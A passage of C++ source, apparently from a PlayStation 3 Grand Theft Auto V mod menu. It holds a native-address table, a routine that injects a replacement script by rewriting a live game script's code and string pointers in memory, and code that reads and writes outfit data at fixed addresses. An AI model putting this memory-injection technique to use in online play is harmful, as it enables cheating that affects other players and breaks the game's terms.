0x1C3D3C8, 0x1C3D3D0, 0x1C3D3D8, 0x1C3D3E0, 0x1C3D3E8, 0x1C3D3F0, 0x1C3D3F8, 0x1C3D400, 0x1C3D408, 0x1C3D410, 0x1C3D418, 0x1C3D420, 0x1C3D428, 0x1C3D430, 0x1C3D438, 0x1C3D440, 0x1C3D448, 0x1C3D450, 0x1C3D458, 0x1C3D460, 0x1C3D468, 0x1C3D470, 0x1C3D478, 0x1C3D480, 0x1C3D488, 0x1C3D490, 0x1C3D498, 0x1C3D4A0, 0x1C3D4A8, 0x1C3D4B0, 0x1C3D4B8, 0x1C3D4C0, 0x1C3D4C8, 0x1C3D4D0, 0x1C3D4D8, 0x1C3D4E0, 0x1C3D4E8, 0x1C3D4F0, 0x1C3D4F8, 0x1C3D500, 0x1C3D508, 0x1C3D510, 0x1C3D518, 0x1C3D520, 0x1C3D528, 0x1C3D530, 0x1C3D538, 0x1C3D540, 0x1C3D548, 0x1C3D550, 0x1C3D558, 0x1C3D560, 0x1C3D568, 0x1C3D570, 0x1C3D578, 0x1C3D580, 0x1C3D588, 0x1C3D590, 0x1C3D598, 0x1C3D5A0, 0x1C3D5A8, 0x1C3D5B0, 0x1C3D5B8, 0x1C3D5C0, 0x1C3D5C8, 0x1C3D5D0, 0x1C3D5D8, 0x1C3D5E0, 0x1C3D5E8, 0x1C3D5F0, 0x1C3D5F8, 0x1C3D600, 0x1C3D608, 0x1C3D610, 0x1C3D618, 0x1C3D620, 0x1C3D628, 0x1C3D630, 0x1C3D638, 0x1C3D640, 0x1C3D648, 0x1C3D650, 0x1C3D658, 0x1C3D660, 0x1C3D668, 0x1C3D670, 0x1C3D678, 0x1C3D680, 0x1C3D688, 0x1C3D690, 0x1C3D698, 0x1C3D6A0, 0x1C3D6A8, 0x1C3D6B0, 0x1C3D6B8, 0x1C3D6C0, 0x1C3D6C8, 0x1C3D6D0, 0x1C3D6D8, 0x1C3D6E0, 0x1C3D6E8, 0x1C3D6F0, 0x1C3D6F8, 0x1C3D700, 0x1C3D708, 0x1C3D710, 0x1C3D718, 0x1C3D720, 0x1C3D728, 0x1C3D730, 0x1C3D738, 0x1C3D740, 0x1C3D748, 0x1C3D750, 0x1C3D758, 0x1C3D760, 0x1C3D768, 0x1C3D770, 0x1C3D778, 0x1C3D780, 0x1C3D788, 0x1C3D790, 0x1C3D798, 0x1C3D7A0, 0x1C3D7A8, 0x1C3D7B0, 0x1C3D7B8, 0x1C3D7C0, 0x1C3D7C8, 0x1C3D7D0, 0x1C3D7D8, 0x1C3D7E0, 0x1C3D7E8, 0x1C3D7F0, 0x1C3D7F8, 0x1C3D800, 0x1C3D808, 0x1C3D810, 0x1C3D818, 0x1C3D820, 0x1C3D828, 0x1C3D830, 0x1C3D838, 0x1C3D840, 0x1C3D848, 0x1C3D850, 0x1C3D858, 0x1C3D860, 0x1C3D868, 0x1C3D870, 0x1C3D878, 0x1C3D880, 0x1C3D888, 0x1C3D890, 0x1C3D898, 0x1C3D8A0, 0x1C3D8A8, 0x1C3D8B0, 0x1C3D8B8, 0x1C3D8C0, 0x1C3D8C8, 0x1C3D8D0, 0x1C3D8D8, 0x1C3D8E0, 0x1C3D8E8, 0x1C3D8F0, 0x1C3D8F8, 0x1C3D900, 0x1C3D908, 0x1C3D910, 0x1C3D918, 0x1C3D920, 0x1C3D928, 0x1C3D930, 0x1C3D938, 0x1C3D940, 0x1C3D948, 0x1C3D950, 0x1C3D958, 0x1C3D960, 0x1C3D968, 0x1C3D970, 0x1C3D978, 0x1C3D980, 0x1C3D988, 0x1C3D990, 0x1C3D998, 0x1C3D9A0, 0x1C3D9A8, 0x1C3D9B0, 0x1C3D9B8, 0x1C3D9C0, 0x1C3D9C8, 0x1C3D9D0, 0x1C3D9D8, 0x1C3D9E0, 0x1C3D9E8, 0x1C3D9F0, 0x1C3D9F8, 0x1C3DA00, 0x1C3DA08, 0x1C3DA10, 0x1C3DA18, 0x1C3DA20, 0x1C3DA28, 0x1C3DA30, 0x1C3DA38, 0x1C3DA40, 0x1C3DA48, 0x1C3DA50, 0x1C3DA58, 0x1C3DA60, 0x1C3DA68, 0x1C3DA70, 0x1C3DA78, 0x1C3DA80, 0x1C3DA88, 0x1C3DA90, 0x1C3DA98, 0x1C3DAA0, 0x1C3DAA8, 0x1C3DAB0, 0x1C3DAB8, 0x1C3DAC0, 0x1C3DAC8, 0x1C3DAD0, 0x1C3DAD8, 0x1C3DAE0, 0x1C3DAE8, 0x1C3DAF0, 0x1C3DAF8, 0x1C3DB00, 0x1C3DB08, 0x1C3DB10, 0x1C3DB18, 0x1C3DB20, 0x1C3DB28, 0x1C3DB30, 0x1C3DB38, 0x1C3DB40, 0x1C3DB48, 0x1C3DB50, 0x1C3DB58, 0x1C3DB60, 0x1C3DB68, 0x1C3DB70, 0x1C3DB78, 0x1C3DB80, 0x1C3DB88, 0x1C3DB90, 0x1C3DB98, 0x1C3DBA0, 0x1C3DBA8, 0x1C3DBB0, 0x1C3DBB8, 0x1C3DBC0, 0x1C3DBC8, 0x1C3DBD0, 0x1C3DBD8, 0x1C3DBE0, 0x1C3DBE8, 0x1C3DBF0, 0x1C3DBF8, 0x1C3DC00, 0x1C3DC08, 0x1C3DC10, 0x1C3DC18, 0x1C3DC20, 0x1C3DC28, 0x1C3DC30, 0x1C3DC38, 0x1C3DC40, 0x1C3DC48, 0x1C3DC50, 0x1C3DC58, 0x1C3DC60, 0x1C3DC68, 0x1C3DC70, 0x1C3DC78, 0x1C3DC80, 0x1C3DC88, 0x1C3DC90, 0x1C3DC98, 0x1C3DCA0, 0x1C3DCA8, 0x1C3DCB0, 0x1C3DCB8, 0x1C3DCC0, 0x1C3DCC8, 0x1C3DCD0, 0x1C3DCD8, 0x1C3DCE0, 0x1C3DCE8, 0x1C3DCF0, 0x1C3DCF8, 0x1C3DD00, 0x1C3DD08, 0x1C3DD10, 0x1C3DD18, 0x1C3DD20, 0x1C3DD28, 0x1C3DD30, 0x1C3DD38, 0x1C3DD40, 0x1C3DD48, 0x1C3DD50, 0x1C3DD58, 0x1C3DD60, 0x1C3DD68, 0x1C3DD70, 0x1C3DD78, 0x1C3DD80, 0x1C3DD88, 0x1C3DD90, 0x1C3DD98, 0x1C3DDA0, 0x1C3DDA8, 0x1C3DDB0, 0x1C3DDB8, 0x1C3DDC0, 0x1C3DDC8, 0x1C3DDD0, 0x1C3DDD8, 0x1C3DDE0, 0x1C3DDE8, 0x1C3DDF0, 0x1C3DDF8, 0x1C3DE00, 0x1C3DE08, 0x1C3DE10, 0x1C3DE18, 0x1C3DE20, 0x1C3DE28, 0x1C3DE30, 0x1C3DE38, 0x1C3DE40, 0x1C3DE48, 0x1C3DE50, 0x1C3DE58, 0x1C3DE60, 0x1C3DE68, 0x1C3DE70, 0x1C3DE78, 0x1C3DE80, 0x1C3DE88, 0x1C3DE90, 0x1C3DE98, 0x1C3DEA0, 0x1C3DEA8, 0x1C3DEB0, 0x1C3DEB8, 0x1C3DEC0, 0x1C3DEC8, 0x1C3DED0, 0x1C3DED8, 0x1C3DEE0, 0x1C3DEE8, 0x1C3DEF0, 0x1C3DEF8, 0x1C3DF00, 0x1C3DF08, 0x1C3DF10, 0x1C3DF18, 0x1C3DF20, 0x1C3DF28, 0x1C3DF30, 0x1C3DF38, 0x1C3DF40, 0x1C3DF48, 0x1C3DF50, 0x1C3DF58, 0x1C3DF60, 0x1C3DF68, 0x1C3DF70, 0x1C3DF78, 0x1C3DF80, 0x1C3DF88, 0x1C3DF90, 0x1C3DF98, 0x1C3DFA0, 0x1C3DFA8, 0x1C3DFB0, 0x1C3DFB8, 0x1C3DFC0, 0x1C3DFC8, 0x1C3DFD0, 0x1C3DFD8, 0x1C3DFE0, 0x1C3DFE8, 0x1C3DFF0, 0x1C3DFF8, 0x1C3E000, 0x1C3E008, 0x1C3E010, 0x1C3E018, 0x1C3E020, 0x1C3E028, 0x1C3E030, 0x1C3E038, 0x1C3E040, 0x1C3E048, 0x1C3E050, 0x1C3E058, 0x1C3E060, 0x1C3E068, 0x1C3E070, 0x1C3E078, 0x1C3E080, 0x1C3E088, 0x1C3E090, 0x1C3E098, 0x1C3E0A0, 0x1C3E0A8, 0x1C3E0B0, 0x1C3E0B8, 0x1C3E0C0, 0x1C3E0C8, 0x1C3E0D0, 0x1C3E0D8, 0x1C3E0E0, 0x1C3E0E8, 0x1C3E0F0, 0x1C3E0F8, 0x1C3E100, 0x1C3E108, 0x1C3E110, 0x1C3E118, 0x1C3E120, 0x1C3E128, 0x1C3E130, 0x1C3E138, 0x1C3E140, 0x1C3E148, 0x1C3E150, 0x1C3E158, 0x1C3E160, 0x1C3E168, 0x1C3E170, 0x1C3E178, 0x1C3E180, 0x1C3E188, 0x1C3E190, 0x1C3E198, 0x1C3E1A0, 0x1C3E1A8, 0x1C3E1B0, 0x1C3E1B8, 0x1C3E1C0, 0x1C3E1C8, 0x1C3E1D0, 0x1C3E1D8, 0x1C3E1E0, 0x1C3E1E8, 0x1C3E1F0, 0x1C3E1F8, 0x1C3E200, 0x1C3E208, 0x1C3E210, 0x1C3E218, 0x1C3E220, 0x1C3E228, 0x1C3E230, 0x1C3E238, 0x1C3E240, 0x1C3E248, 0x1C3E250, 0x1C3E258, 0x1C3E260, 0x1C3E268, 0x1C3E270, 0x1C3E278, 0x1C3E280, 0x1C3E288, 0x1C3E290, 0x1C3E298, 0x1C3E2A0, 0x1C3E2A8, 0x1C3E2B0, 0x1C3E2B8, 0x1C3E2C0, 0x1C3E2C8, 0x1C3E2D0, 0x1C3E2D8, 0x1C3E2E0, 0x1C3E2E8, 0x1C3E2F0, 0x1C3E2F8, 0x1C3E300, 0x1C3E308, 0x1C3E310, 0x1C3E318, 0x1C3E320, 0x1C3E328, 0x1C3E330, 0x1C3E338, 0x1C3E340, 0x1C3E348, 0x1C3E350, 0x1C3E358, 0x1C3E360, 0x1C3E368, 0x1C3E370, 0x1C3E378, 0x1C3E380, 0x1C3E388, 0x1C3E390, 0x1C3E398, 0x1C3E3A0, 0x1C3E3A8, 0x1C3E3B0, 0x1C3E3B8, 0x1C3E3C0, 0x1C3E3C8, 0x1C3E3D0, 0x1C3E3D8, 0x1C3E3E0, 0x1C3E3E8, 0x1C3E3F0, 0x1C3E3F8, 0x1C3E400, 0x1C3E408, 0x1C3E410, 0x1C3E418, 0x1C3E420, 0x1C3E428, 0x1C3E430, 0x1C3E438, 0x1C3E440, 0x1C3E448, 0x1C3E450, 0x1C3E458, 0x1C3E460, 0x1C3E468, 0x1C3E470, 0x1C3E478, 0x1C3E480, 0x1C3E488, 0x1C3E490, 0x1C3E498, 0x1C3E4A0, 0x1C3E4A8, 0x1C3E4B0, 0x1C3E4B8, 0x1C3E4C0, 0x1C3E4C8, 0x1C3E4D0, 0x1C3E4D8, 0x1C3E4E0, 0x1C3E4E8, 0x1C3E4F0, 0x1C3E4F8, 0x1C3E500, 0x1C3E508, 0x1C3E510, 0x1C3E518, 0x1C3E520, 0x1C3E528, 0x1C3E530, 0x1C3E538, 0x1C3E540, 0x1C3E548, 0x1C3E550, 0x1C3E558, 0x1C3E560, 0x1C3E568, 0x1C3E570, 0x1C3E578, 0x1C3E580, 0x1C3E588, 0x1C3E590, 0x1C3E598, 0x1C3E5A0, 0x1C3E5A8, 0x1C3E5B0, 0x1C3E5B8, 0x1C3E5C0, 0x1C3E5C8, 0x1C3E5D0, 0x1C3E5D8, 0x1C3E5E0, 0x1C3E5E8, 0x1C3E5F0, 0x1C3E5F8, 0x1C3E600, 0x1C3E608, 0x1C3E610, 0x1C3E618, 0x1C3E620, 0x1C3E628, 0x1C3E630, 0x1C3E638, 0x1C3E640, 0x1C3E648, 0x1C3E650, 0x1C3E658, 0x1C3E660, 0x1C3E668, 0x1C3E670, 0x1C3E678, 0x1C3E680, 0x1C3E688, 0x1C3E690, 0x1C3E698, 0x1C3E6A0, 0x1C3E6A8, 0x1C3E6B0, 0x1C3E6B8, 0x1C3E6C0, 0x1C3E6C8, 0x1C3E6D0, 0x1C3E6D8, 0x1C3E6E0, 0x1C3E6E8, 0x1C3E6F0, 0x1C3E6F8, 0x1C3E700, 0x1C3E708, 0x1C3E710, 0x1C3E718, 0x1C3E720, 0x1C3E728, 0x1C3E730, 0x1C3E738, 0x1C3E740, 0x1C3E748, 0x1C3E750, 0x1C3E758, 0x1C3E760, 0x1C3E768, 0x1C3E770, 0x1C3E778, 0x1C3E780, 0x1C3E788, 0x1C3E790, 0x1C3E798, 0x1C3E7A0, 0x1C3E7A8, 0x1C3E7B0, 0x1C3E7B8, 0x1C3E7C0, 0x1C3E7C8, 0x1C3E7D0, 0x1C3E7D8, 0x1C3E7E0, 0x1C3E7E8, 0x1C3E7F0, 0x1C3E7F8, 0x1C3E800, 0x1C3E808, 0x1C3E810, 0x1C3E818, 0x1C3E820, 0x1C3E828, 0x1C3E830, 0x1C3E838, 0x1C3E840, 0x1C3E848, 0x1C3E850, 0x1C3E858, 0x1C3E860, 0x1C3E868, 0x1C3E870, 0x1C3E878, 0x1C3E880, 0x1C3E888, 0x1C3E890, 0x1C3E898, 0x1C3E8A0, 0x1C3E8A8, 0x1C3E8B0, 0x1C3E8B8, 0x1C3E8C0, 0x1C3E8C8, 0x1C3E8D0, 0x1C3E8D8, 0x1C3E8E0, 0x1C3E8E8, 0x1C3E8F0, 0x1C3E8F8, 0x1C3E900, 0x1C3E908, 0x1C3E910, 0x1C3E918, 0x1C3E920, 0x1C3E928, 0x1C3E930, 0x1C3E938, 0x1C3E940, 0x1C3E948, 0x1C3E950, 0x1C3E958, 0x1C3E960, 0x1C3E968, 0x1C3E970, 0x1C3E978, 0x1C3E980, 0x1C3E988, 0x1C3E990, 0x1C3E998, 0x1C3E9A0, 0x1C3E9A8, 0x1C3E9B0, 0x1C3E9B8, 0x1C3E9C0, 0x1C3E9C8, 0x1C3E9D0, 0x1C3E9D8, 0x1C3E9E0, 0x1C3E9E8, 0x1C3E9F0, 0x1C3E9F8, 0x1C3EA00, 0x1C3EA08, 0x1C3EA10, 0x1C3EA18, 0x1C3EA20, 0x1C3EA28, 0x1C3EA30, 0x1C3EA38, 0x1C3EA40, 0x1C3EA48, 0x1C3EA50, 0x1C3EA58, 0x1C3EA60, 0x1C3EA68, 0x1C3EA70, 0x1C3EA78, 0x1C3EA80, 0x1C3EA88, 0x1C3EA90, 0x1C3EA98, 0x1C3EAA0, 0x1C3EAA8, 0x1C3EAB0, 0x1C3EAB8, 0x1C3EAC0, 0x1C3EAC8, 0x1C3EAD0, 0x1C3EAD8, 0x1C3EAE0, 0x1C3EAE8, 0x1C3EAF0, 0x1C3EAF8, 0x1C3EB00, 0x1C3EB08, 0x1C3EB10, 0x1C3EB18, 0x1C3EB20, 0x1C3EB28, 0x1C3EB30, 0x1C3EB38, 0x1C3EB40, 0x1C3EB48, 0x1C3EB50, 0x1C3EB58, 0x1C3EB60, 0x1C3EB68, 0x1C3EB70, 0x1C3EB78, 0x1C3EB80, 0x1C3EB88, 0x1C3EB90, 0x1C3EB98, 0x1C3EBA0, 0x1C3EBA8, 0x1C3EBB0, 0x1C3EBB8, 0x1C3EBC0, 0x1C3EBC8, 0x1C3EBD0, 0x1C3EBD8, 0x1C3EBE0, 0x1C3EBE8, 0x1C3EBF0, 0x1C3EBF8, 0x1C3EC00, 0x1C3EC08, 0x1C3EC10, 0x1C3EC18, 0x1C3EC20, 0x1C3EC28, 0x1C3EC30, 0x1C3EC38, 0x1C3EC40, 0x1C3EC48, 0x1C3EC50, 0x1C3EC58, 0x1C3EC60, 0x1C3EC68, 0x1C3EC70, 0x1C3EC78, 0x1C3EC80, 0x1C3EC88, 0x1C3EC90, 0x1C3EC98, 0x1C3ECA0, 0x1C3ECA8, 0x1C3ECB0, 0x1C3ECB8, 0x1C3ECC0, 0x1C3ECC8, 0x1C3ECD0, 0x1C3ECD8, 0x1C3ECE0, 0x1C3ECE8, 0x1C3ECF0, 0x1C3ECF8, 0x1C3ED00, 0x1C3ED08, 0x1C3ED10, 0x1C3ED18, 0x1C3ED20, 0x1C3ED28, 0x1C3ED30, 0x1C3ED38, 0x1C3ED40, 0x1C3ED48, 0x1C3ED50, 0x1C3ED58, 0x1C3ED60, 0x1C3ED68, 0x1C3ED70, 0x1C3ED78, 0x1C3ED80, 0x1C3ED88, 0x1C3ED90, 0x1C3ED98, 0x1C3EDA0, 0x1C3EDA8, 0x1C3EDB0, 0x1C3EDB8, 0x1C3EDC0, 0x1C3EDC8, 0x1C3EDD0, 0x1C3EDD8, 0x1C3EDE0, 0x1C3EDE8, 0x1C3EDF0, 0x1C3EDF8, 0x1C3EE00, 0x1C3EE08, 0x1C3EE10, 0x1C3EE18, 0x1C3EE20, 0x1C3EE28, 0x1C3EE30, 0x1C3EE38, 0x1C3EE40, 0x1C3EE48, 0x1C3EE50, 0x1C3EE58, 0x1C3EE60, 0x1C3EE68, 0x1C3EE70, 0x1C3EE78, 0x1C3EE80, 0x1C3EE88, 0x1C3EE90, 0x1C3EE98, 0x1C3EEA0, 0x1C3EEA8, 0x1C3EEB0, 0x1C3EEB8, 0x1C3EEC0, 0x1C3EEC8, 0x1C3EED0, 0x1C3EED8, 0x1C3EEE0, 0x1C3EEE8, 0x1C5E3B0, 0x1C5E3B8, 0x1C5E3C0, 0x1C5E3C8, 0x1C5E3A8, 0x1C5E3D0, 0x1C5E3D8, 0x1C5E3F8, 0x1C5E400, 0x1C5E408, 0x1C5E410, 0x1C5E418, 0x1C5E420, 0x1C5E428, 0x1C5E430, 0x1C5E438, 0x1C5E440, 0x1C5E448, 0x1C5E450, 0x1C5E458, 0x1C5E460, 0x1C5E468, 0x1C5E470, 0x1C5E478, 0x1C5E480, 0x1C5E488, 0x1C5E490 };
				int nat = ReadUInt32(file, nativePointer + (i * 4), false);
				int at = -1;
				for (int j = 0; j < 5053; j++) {
					if (readFileArray(fdN, j) == nat) {
						at = j;
						break;
					}
				}
				if (at != -1) {
					nativesOPDList[i] = readFileArray(fdO, at);
				}
				else {
					//printf("Native 0x%X not found for BLUS!\n", nat);
				}
			}
		}
		closeFile(fdN);
		closeFile(fdO);
		PS3dotSetMemory(baseAddress + nativePointer, (char*)nativesOPDList, nativeCount * 4);
		renderPercents = false;
	}


	void injectAlreadyInjectedFile(char* file, bool checkNatives, unsigned int scriptHash) {

		int baseAddress = 0x10025000;

		//uint pointer = (uint)getN4rage10scrProgramE(GAMEPLAY::GET_HASH_KEY(overriteScriptName));//NEED TO UPDOOT THIS
		uint pointer = findScriptAddressRemote(scriptHash/*0xa57e7489*/);
		if (!VALID_ADDR(pointer)) {
			//printf("Invalid pointer! 0x%X\n", pointer);
			return;
		}

		unsigned int scriptHashRead = ReadUInt32Mem(pointer + 0x38);
		if (scriptHashRead != scriptHash) {
			//printf("Script hash found is not correct! 0x%X found but want 0x%X\n", scriptHashRead, scriptHash);
			return;
		}

		//printf("Overriting script at 0x%X\n", pointer);



		rsc7 = 0;

		if (ReadUInt32(file, 0, false) == 0x52534337)
			rsc7 = 16;

		uint nativeCount = ReadUInt32(file, 0x20, false);//0x01B4 for rock_menu2
		uint nativePointer = ReadUInt32(file, 0x2C, true);

		//printf("a\n");
		if (ReadUInt32Mem(pointer + 0x20) < nativeCount) {
			//printf("ERROR: Script has too liittle natives\n");
			return;
		}

		uint memNativePointer = ReadUInt32Mem(pointer + 0x2C);
		uint codeLength = ReadUInt32(file, 0x10, false);
		SetUInt32Mem(pointer + 0x10, codeLength);
		uint stringLength = ReadUInt32(file, 0x48, false);
		SetUInt32Mem(pointer + 0x48, stringLength);
		uint staticCount = ReadUInt32(file, 0x18, false);
		SetUInt32Mem(pointer + 0x18, staticCount);


		//printf("b\n");

		SetUInt32Mem(pointer + 0x2C, baseAddress + nativePointer);

		//printf("l\n");




		uint codePointerList = ReadUInt32(file, 8, true);

		int memCodePointerList = ReadUInt32Mem(pointer + 8);
		//printf("m\n");
		for (uint i = 0; i < (codeLength / 0x4000) + 1; i++)
		{
			uint codePagePointer = ReadUInt32(file, codePointerList + (i * 4), true);
			//printf("n\n");
			//int memCodePagePointer = ReadUInt32Mem(memCodePointerList + (i*4));

			SetUInt32Mem(memCodePointerList + (i * 4), baseAddress + codePagePointer);

			/*if (!VALID_ADDR(memCodePagePointer)) {
				printf("ERROR: Code page %i is not valid!\n",i);
				return;
			}
			if (i == codeLength / 0x4000) {
				char *bytes = ReadBytes(file,codePagePointer + rsc7,(int)codeLength % 0x4000);
				PS3dotSetMemory(memCodePagePointer, bytes,(int)codeLength % 0x4000);
			}
			else {
				char *bytes = ReadBytes(file,codePagePointer + rsc7,0x4000);
				PS3dotSetMemory(memCodePagePointer, bytes,0x4000);
			}*/
		}

		//printf("u\n");

		uint stringPointer = ReadUInt32(file, 0x44, true);
		int memStringPointer = ReadUInt32Mem(pointer + 0x44);
		for (uint i = 0; i < (stringLength / 0x4000) + 1; i++)
		{
			uint stringPagePointer = ReadUInt32(file, stringPointer + (i * 4), true);
			//int strPtr = ReadUInt32Mem(memStringPointer + (i*4));

			SetUInt32Mem(memStringPointer + (i * 4), baseAddress + stringPagePointer);

			/*if (!VALID_ADDR(strPtr)) {
				printf("ERROR: String page %i is not valid!\n",i);
			}
			if (i == stringLength / 0x4000) {
				char *bytes = ReadBytes(file,stringPagePointer + rsc7,(int)stringLength % 0x4000);
				PS3dotSetMemory(strPtr, bytes,(int)stringLength % 0x4000);
			}
			else {
				char *bytes = ReadBytes(file,stringPagePointer + rsc7,0x4000);
				PS3dotSetMemory(strPtr, bytes,0x4000);
			}*/
		}



		//printf("x\n");

		uint staticPointer = ReadUInt32(file, 0x24, true);
		//char *bytes64536 = ReadBytes(file,staticPointer + rsc7,(int)staticCount * 4);//size of 2992 aka 0xBB0
		//PS3dotSetMemory(0x10025000/*staticPointer + pointer*/, bytes64536,(int)staticCount * 4);
		//0x10020000
		SetUInt32Mem(pointer + 0x24, baseAddress + staticPointer/*staticPointer + pointer*/);

		//printf("z\n");


	}

#endif

#pragma region outfits

	namespace Outfits
	{
		struct OutfitStruct
		{
		public:
			char outfitName[0x30];//0x20 is actual size

			int mask;
			int torso;
			int pants;
			int parachute;
			int shoes;
			int misc1;
			int tops1;
			int armour;
			int crew;
			int tops2;
			int hat;
			int glasses;
			int earpiece;

			int maskTexture;
			int torsoTexture;
			int pantsTexture;
			int parachuteTexture;
			int shoesTexture;
			int misc1Texture;
			int tops1Texture;
			int armourTexture;
			int crewTexture;
			int tops2Texture;
			int hatTexture;
			int glassesTexture;
			int earpieceTexture;




		};
		struct Outfit
		{
		public:
			uint outfitStructLen;
#define outfitNameLen 0x20
			uint accessoriesStructLen;
			uint pointerToOutfitStruct;
			uint pointerToNames;
			uint pointerToAccessories;
			uint pointerToAccessoriesTextures;
			uint pointerToOutfitTextures;
			uint Address;

			uint pointer127;

			int currentOutfit;



			bool inited;


			bool Init(bool bles) {
				inited = false;
				currentOutfit = 0;

				outfitStructLen = 0x34;
				accessoriesStructLen = 0x28;
				pointerToOutfitStruct = 0x710;
				pointerToNames = 0x108;
				pointerToAccessories = 0x2F8;
				pointerToAccessoriesTextures = 0x164;
				pointerToOutfitTextures = 0x500;

				pointer127 = 0x02223918;


				if (bles)
					Address = read32(pointer127);//bles address 
				else
					Address = read32(0x2233CC8 + 0x50);//blus address

				if (VALID_ADDR(Address))
					inited = true;
				return (Address != 0);

			}


#define GetOutfitsCount() 10


			OutfitStruct outfits[GetOutfitsCount()];
			char outfitNames[GetOutfitsCount()][outfitNameLen + 1];

			void Fetch(int outfitIndex) {

				OutfitStruct tempOutfit = OutfitStruct();
				uint outfit_struct = (Address - pointerToOutfitStruct) + ((uint)outfitIndex * outfitStructLen) + 4;
				uint accessory_struct = (Address - pointerToAccessories) + ((uint)outfitIndex * accessoriesStructLen);
				uint accessory_textures = (Address - pointerToAccessoriesTextures) + ((uint)outfitIndex * accessoriesStructLen);
				uint outfit_textures = (Address - pointerToOutfitTextures) + ((uint)outfitIndex * outfitStructLen);
				strncpy(tempOutfit.outfitName, GetOutfitName(outfitIndex), 0x20);
				tempOutfit.mask = ReadInt32(outfit_struct);
				//i think 0x04 is hair but i didnt test it
				tempOutfit.torso = ReadInt32(outfit_struct + 0x08);
				tempOutfit.pants = ReadInt32(outfit_struct + 0x0C);
				tempOutfit.parachute = ReadInt32(outfit_struct + 0x10);
				tempOutfit.shoes = ReadInt32(outfit_struct + 0x14);
				tempOutfit.misc1 = ReadInt32(outfit_struct + 0x18);
				tempOutfit.tops1 = ReadInt32(outfit_struct + 0x1C);
				tempOutfit.armour = ReadInt32(outfit_struct + 0x20);
				tempOutfit.crew = ReadInt32(outfit_struct + 0x24);
				tempOutfit.tops2 = ReadInt32(outfit_struct + 0x28);

				tempOutfit.maskTexture = ReadInt32(outfit_textures);
				//i think 0x04 is hair but i didnt test it
				tempOutfit.torsoTexture = ReadInt32(outfit_textures + 0x08);
				tempOutfit.pantsTexture = ReadInt32(outfit_textures + 0x0C);
				tempOutfit.parachuteTexture = ReadInt32(outfit_textures + 0x10);
				tempOutfit.shoesTexture = ReadInt32(outfit_textures + 0x14);
				tempOutfit.misc1Texture = ReadInt32(outfit_textures + 0x18);
				tempOutfit.tops1Texture = ReadInt32(outfit_textures + 0x1C);
				tempOutfit.armourTexture = ReadInt32(outfit_textures + 0x20);
				tempOutfit.crewTexture = ReadInt32(outfit_textures + 0x24);
				tempOutfit.tops2Texture = ReadInt32(outfit_textures + 0x28);

				tempOutfit.hat = ReadInt32(accessory_struct);
				tempOutfit.glasses = ReadInt32(accessory_struct + 0x04);
				tempOutfit.earpiece = ReadInt32(accessory_struct + 0x08);

				tempOutfit.hatTexture = ReadInt32(accessory_textures);
				tempOutfit.glassesTexture = ReadInt32(accessory_textures + 0x04);
				tempOutfit.earpieceTexture = ReadInt32(accessory_textures + 0x08);

				outfits[outfitIndex] = tempOutfit;
			}

			bool Poke(int outfitIndex) {
				//outfit.outfits[outfit.currentOutfit]
				OutfitStruct o = outfits[outfitIndex];
				
				uint outfit_struct = (Address - pointerToOutfitStruct) + ((uint)outfitIndex * outfitStructLen) + 4;
				uint accessory_struct = (Address - pointerToAccessories) + ((uint)outfitIndex * accessoriesStructLen);
				uint accessory_textures = (Address - pointerToAccessoriesTextures) + ((uint)outfitIndex * accessoriesStructLen);
				uint outfit_textures = (Address - pointerToOutfitTextures) + ((uint)outfitIndex * outfitStructLen);
				uint name = (Address + pointerToNames) + ((uint)outfitIndex * outfitNameLen);

				writeStringLength(name, o.outfitName, outfitNameLen);

				WriteInt32(outfit_struct, o.mask);
				WriteInt32(outfit_struct + 0x08, o.torso);
				WriteInt32(outfit_struct + 0x0C, o.pants);
				WriteInt32(outfit_struct + 0x10, o.parachute);
				WriteInt32(outfit_struct + 0x14, o.shoes);
				WriteInt32(outfit_struct + 0x18, o.misc1);
				WriteInt32(outfit_struct + 0x1C, o.tops1);
				WriteInt32(outfit_struct + 0x20, o.armour);
				WriteInt32(outfit_struct + 0x24, o.crew);
				WriteInt32(outfit_struct + 0x28, o.tops2);

				WriteInt32(outfit_textures, o.maskTexture);
				WriteInt32(outfit_textures + 0x08, o.torsoTexture);
				WriteInt32(outfit_textures + 0x0C, o.pantsTexture);
				WriteInt32(outfit_textures + 0x10, o.parachuteTexture);
				WriteInt32(outfit_textures + 0x14, o.shoesTexture);
				WriteInt32(outfit_textures + 0x18, o.misc1Texture);
				WriteInt32(outfit_textures + 0x1C, o.tops1Texture);
				WriteInt32(outfit_textures + 0x20, o.armourTexture);
				WriteInt32(outfit_textures + 0x24, o.crewTexture);
				WriteInt32(outfit_textures + 0x28, o.tops2Texture);

				WriteInt32(accessory_struct, o.hat);
				WriteInt32(accessory_struct + 0x04, o.glasses);
				WriteInt32(accessory_struct + 0x08, o.earpiece);

				WriteInt32(accessory_textures, o.hatTexture);
				WriteInt32(accessory_textures + 0x04, o.glassesTexture);
				WriteInt32(accessory_textures + 0x08, o.earpieceTexture);

				return true;
			}
			/*public static char** FetchOutfitNames() {
				static char output[GetOutfitsCount()][outfitNameLen];
				for (int i = 0; i < GetOutfitsCount(); i++) {
					uint a = (Address + pointerToNames) + ((uint)i * outfitNameLen);

					ReadString(a, output[i], outfitNameLen);
					outfits[]
				}
				return output;
			}*/


			
			char* GetOutfitName(int index) {

				uint a = (Address + pointerToNames) + ((uint)index * outfitNameLen);
				ReadString(a, outfitNames[index], outfitNameLen);
				strncpy(outfits[index].outfitName, outfitNames[index], outfitNameLen);
				return outfitNames[index];
			}



			/*
			public static List<OutfitStruct> FetchAllOutfits() {
				List<OutfitStruct> outfitList = new List<OutfitStruct>();
				int outfitCount = GetOutfitsCount();
				for (int i = 0; i < outfitCount; i++) {
					OutfitStruct o = Fetch(i);
					outfitList.Add(o);
				}
				return outfitList;
			}

			public static List<OutfitStruct> FetchOutfitsFromFile(string filename) {
				var o = new List<OutfitStruct>();
				if (!File.Exists(filename)) {
					return o;
				}
				using (Stream s = new FileStream(filename, FileMode.Open))
					using (StreamReader sr = new StreamReader(s)) {
					o = JsonConvert.DeserializeObject<List<OutfitStruct>>(sr.ReadToEnd());
					sr.Close();
					s.Close();
				}
				return o ? ? new List<OutfitStruct>();
			}

			public static void SaveCustomOutfitsToFile() {
				using (Stream s = new FileStream("outfits.json", FileMode.OpenOrCreate | FileMode.Truncate))
					using (StreamWriter sw = new StreamWriter(s)) {
					sw.Write(JsonConvert.SerializeObject(Outfit.customOutfits, Formatting.Indented));
					sw.Close();
					s.Close();
				}
			}
			*/


			/*static byte ReadByte(UInt32 address)
			{

				return 1;
					//return PS3.Extension.ReadByte(address);
			}*/
			static int ReadInt32(unsigned int address)
			{

				return read32(address);
			}
			static uint ReadUInt32(unsigned int address)
			{

